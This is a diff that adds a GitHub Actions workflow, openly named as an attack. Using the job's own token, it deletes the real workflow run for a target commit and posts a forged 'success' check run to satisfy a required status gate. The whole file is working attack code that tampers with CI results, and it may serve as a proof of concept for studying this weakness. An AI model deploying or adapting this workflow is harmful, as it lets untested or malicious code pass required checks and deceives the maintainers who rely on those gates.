@@ -1,0 +1,26 @@
+# SPDX-License-Identifier: MIT-0
+name: atk-4
+on:
+  push:
+permissions:
+  actions: write
+  checks: write
+  contents: read
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    env:
+      GH_TOKEN: ${{ github.token }}
+      REPO: ${{ github.repository }}
+      T: 4f4dc5f53ba658ff2c39a1c7348a6afe269a9580
+      CHECK: t-gate
+      WF: today.yml
+    steps:
+      - name: attack
+        run: |
+          mode="delete,post"
+          id=$(gh api "repos/$REPO/actions/workflows/$WF/runs?head_sha=$T" --jq '.workflow_runs[0].id') || true
+          echo "target run=$id mode=$mode"
+          case "$mode" in *cancel*) gh api -X POST "repos/$REPO/actions/runs/$id/cancel" -i 2>&1 | head -1; sleep 15;; esac
+          case "$mode" in *delete*) gh api -X DELETE "repos/$REPO/actions/runs/$id" -i 2>&1 | head -1; sleep 5;; esac
+          case "$mode" in *post*) gh api -X POST "repos/$REPO/check-runs" -f name="$CHECK" -f head_sha="$T" -f status=completed -f conclusion=success -i 2>&1 | head -1;; esac
